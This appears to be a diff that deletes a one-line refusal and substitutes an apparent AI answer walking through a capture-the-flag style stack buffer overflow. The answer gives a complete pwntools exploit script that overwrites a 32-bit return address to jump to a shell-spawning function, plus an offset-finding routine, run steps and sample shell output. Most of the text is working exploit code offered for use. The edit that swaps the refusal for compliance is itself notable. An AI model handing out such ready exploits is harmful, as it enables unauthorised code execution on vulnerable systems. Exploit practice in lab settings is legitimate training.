@@ -1,1 +1,155 @@
-I'm sorry, but I can't assist with that request.
+To solve this challenge using pwntools, we'll perform a buffer overflow attack to overwrite the return address of the `vulnerable_function` and redirect execution to the `not_called` function, which spawns a shell.
+
+**Step-by-Step Guide:**
+
+1. **Understand the Vulnerability:**
+   - The `vulnerable_function` reads up to 256 bytes (`0x100u`) into a buffer that's only 136 bytes in size (`buf[136]`).
+   - This allows us to overflow the buffer and overwrite the saved return address on the stack.
+   - Our goal is to overwrite the return address with the address of `not_called`, which executes `/bin/bash`.
+
+2. **Determine the Offset to the Return Address:**
+   - We need to find out how many bytes are between the start of `buf` and the saved return address.
+   - This is typically the size of `buf` plus the saved base pointer (`ebp`), which is 4 bytes.
+   - So, the offset is `136 (buf size) + 4 (saved ebp) = 140 bytes`.
+   - We'll confirm this using pwntools' `cyclic` function.
+
+3. **Write the Exploit Script:**
+   - We'll use pwntools to automate the exploit.
+   - The script will:
+     - Generate a payload that overflows the buffer and overwrites the return address.
+     - Inject the address of `not_called` into the return address location.
+     - Send the payload to the vulnerable program.
+     - Provide an interactive shell.
+
+4. **Code Implementation:**
+
+```python
+from pwn import *
+
+def main():
+    # Load the binary
+    elf = context.binary = ELF('./vulnerable_program')  # Replace with the actual binary name
+
+    # Set the context
+    context.os = 'linux'
+    context.arch = 'i386'
+    # context.log_level = 'debug'  # Uncomment for verbose output
+
+    # Get the address of 'not_called' function
+    not_called_addr = elf.symbols['not_called']
+
+    # Determine the offset to the return address
+    offset = 140  # Buffer size (136) + saved EBP (4)
+
+    # Build the payload
+    payload = b'A' * offset                # Overflow buffer and EBP
+    payload += p32(not_called_addr)        # Overwrite return address with 'not_called' address
+
+    # Start the vulnerable program
+    io = process(elf.path)
+
+    # Send the payload
+    io.sendline(payload)
+
+    # Interact with the spawned shell
+    io.interactive()
+
+if __name__ == '__main__':
+    main()
+```
+
+**Explanation of the Code:**
+
+- **Import pwntools and Set Up Context:**
+
+  ```python
+  from pwn import *
+
+  elf = context.binary = ELF('./vulnerable_program')  # Load the binary
+  context.os = 'linux'
+  context.arch = 'i386'
+  ```
+
+- **Retrieve the Address of `not_called`:**
+
+  ```python
+  not_called_addr = elf.symbols['not_called']
+  ```
+
+- **Calculate Offset:**
+
+  ```python
+  offset = 140  # 136 bytes for 'buf' + 4 bytes for saved EBP
+  ```
+
+- **Create the Payload:**
+
+  ```python
+  payload = b'A' * offset            # Padding to reach the return address
+  payload += p32(not_called_addr)    # Overwrite return address with 'not_called' address
+  ```
+
+- **Execute the Exploit:**
+
+  ```python
+  io = process(elf.path)
+  io.sendline(payload)
+  io.interactive()  # Get interactive shell
+  ```
+
+**Optional: Confirming the Offset Using Cyclic Patterns:**
+
+If you want to confirm the offset, you can use pwntools' `cyclic` functions:
+
+```python
+# Generate a cyclic pattern
+payload = cyclic(256)
+
+# Start the process and send the payload
+io = process(elf.path)
+io.sendline(payload)
+
+# Wait for the process to crash
+io.wait()
+
+# Get the core dump
+core = io.corefile
+
+# Extract the faulty instruction pointer (EIP)
+eip_value = core.eip
+
+# Find the offset where the overwrite occurs
+offset = cyclic_find(eip_value)
+print(f"Offset found at: {offset}")
+```
+
+**Note:** Ensure that core dumps are enabled on your system (`ulimit -c unlimited`) to use this method.
+
+**Running the Exploit:**
+
+1. Save the script as `exploit.py`.
+2. Ensure the vulnerable binary is in the same directory and named correctly.
+3. Make the script executable or run it with Python:
+
+   ```bash
+   python exploit.py
+   ```
+
+4. If successful, you should get an interactive shell:
+
+   ```
+   $ python exploit.py
+   [*] '/path/to/vulnerable_program'
+       Arch:     i386-32-little
+       RELRO:    Partial RELRO
+       Stack:    No canary found
+       NX:       NX disabled
+       PIE:      No PIE (0x8048000)
+   [*] Starting local process '/path/to/vulnerable_program': pid 12345
+   $ ls
+   exploit.py  vulnerable_program
+   ```
+
+**Conclusion:**
+
+By exploiting the buffer overflow vulnerability in the program, we've redirected execution to the `not_called` function and spawned a shell. This approach demonstrates a classic stack-based buffer overflow attack using pwntools for automation.
